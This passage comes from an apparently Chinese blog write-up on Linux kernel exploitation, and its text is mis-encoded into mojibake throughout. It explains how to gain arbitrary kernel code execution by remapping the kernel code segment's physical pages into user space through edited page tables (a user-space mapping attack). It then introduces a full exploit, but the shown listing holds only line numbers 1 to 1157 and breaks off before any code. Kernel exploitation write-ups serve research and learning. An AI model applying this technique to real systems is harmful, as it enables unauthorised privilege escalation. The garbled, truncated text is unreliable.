¸æ ˆåœ°å€ä¸å˜ï¼‰ç„¶åå†™å…¥æ•°æ®åä»æ—§æ— äº‹å‘ç”Ÿï¼Œä¹Ÿä¸çŸ¥é“ç©¶ç«Ÿæ˜¯å“ªå‡ºäº†é—®é¢˜ ï¼š(</p></blockquote></blockquote><h3 id="æ–¹æ³•ä¸‰ã€å†…æ ¸é¡µè¡¨è§£æè·å–ä»£ç æ®µç‰©ç†åœ°å€ï¼Œæ”¹å†™å†…æ ¸é¡µè¡¨å»ºç«‹æ–°æ˜ å°„å®ç°-USMA"><a href="#æ–¹æ³•ä¸‰ã€å†…æ ¸é¡µè¡¨è§£æè·å–ä»£ç æ®µç‰©ç†åœ°å€ï¼Œæ”¹å†™å†…æ ¸é¡µè¡¨å»ºç«‹æ–°æ˜ å°„å®ç°-USMA" class="headerlink" title="æ–¹æ³•ä¸‰ã€å†…æ ¸é¡µè¡¨è§£æè·å–ä»£ç æ®µç‰©ç†åœ°å€ï¼Œæ”¹å†™å†…æ ¸é¡µè¡¨å»ºç«‹æ–°æ˜ å°„å®ç° USMA"></a>æ–¹æ³•ä¸‰ã€å†…æ ¸é¡µè¡¨è§£æè·å–ä»£ç æ®µç‰©ç†åœ°å€ï¼Œæ”¹å†™å†…æ ¸é¡µè¡¨å»ºç«‹æ–°æ˜ å°„å®ç° USMA</h3><p>æ—¢ç„¶æˆ‘ä»¬èƒ½å¤Ÿè¿›è¡Œå†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œ<strong>ç›´æ¥æ”¹å†™å†…æ ¸ä»£ç æ®µä¹Ÿæ˜¯ä¸€ä¸ªå®ç°ä»»æ„ä»£ç æ‰§è¡Œçš„å¥½åŠæ³•</strong>ï¼Œä½†æ˜¯ç›´æ¥æ˜ å°„åŒºå¯¹åº”çš„å†…æ ¸ä»£ç æ®µåŒºåŸŸ<strong>æ²¡æœ‰å¯å†™å…¥æƒé™ï¼Œç›´æ¥å†™ä¼šå¯¼è‡´ kernel panic :ï¼ˆ</strong></p><p>ä½†æ˜¯æ”¹å†™å†…æ ¸ä»£ç æ®µæœ¬è´¨ä¸Šä¾¿æ˜¯å‘å¯¹åº”çš„ç‰©ç†é¡µå†™å…¥æ•°æ®ï¼Œè€Œæˆ‘ä»¬åˆèƒ½å¤Ÿè¯»å†™è¿›ç¨‹é¡µè¡¨ï¼Œ<strong>æˆ‘ä»¬ç›´æ¥åœ¨ç”¨æˆ·ç©ºé—´å»ºç«‹ä¸€ä¸ªåˆ°å†…æ ¸ä»£ç æ®µå¯¹åº”ç‰©ç†å†…å­˜çš„æ˜ å°„å°±èƒ½æ”¹å†™å†…æ ¸ä»£ç æ®µäº†ï¼šï¼‰</strong></p><p>æ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ <code>mmap()</code> éšä¾¿æ˜ å°„ä¸€å—å†…å­˜ï¼Œä¹‹åæ”¹å†™ <code>mmap()</code> çš„è™šæ‹Ÿåœ°å€åœ¨é¡µè¡¨ä¸­å¯¹åº”çš„ç‰©ç†åœ°å€å³å¯ï¼Œè¿™ç§æ–¹æ³•æœ¬è´¨ä¸Šå…¶å®å°±æ˜¯ <a href="https://vul.360.net/archives/391">ç”¨æˆ·æ€æ˜ å°„æ”»å‡»</a>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/U3BEbFTsZiy48NQ.png" alt="image.png"></p><h2 id="Final-Exploitation"><a href="#Final-Exploitation" class="headerlink" title="Final Exploitation"></a>Final Exploitation</h2><p>æœ€ç»ˆçš„å®Œæ•´ exp å¦‚ä¸‹ï¼Œ<strong>åŒæ—¶åŒ…å«ç¬”è€…æ‰€ç»™å‡ºçš„ä¸‰ç§ææƒæ‰‹æ®µçš„ä»£ç </strong>ï¼š</p><blockquote><p>ç”±äº page ç»“æ„ä½“åœ°å€å¯èƒ½å‡ºç°æœ«å­—èŠ‚ä¸º <code>\x00</code> çš„æƒ…å†µï¼Œæ•…æˆåŠŸå‡ ç‡ä»…æœ‰ 75% ï¼ˆæ‚²ï¼‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span 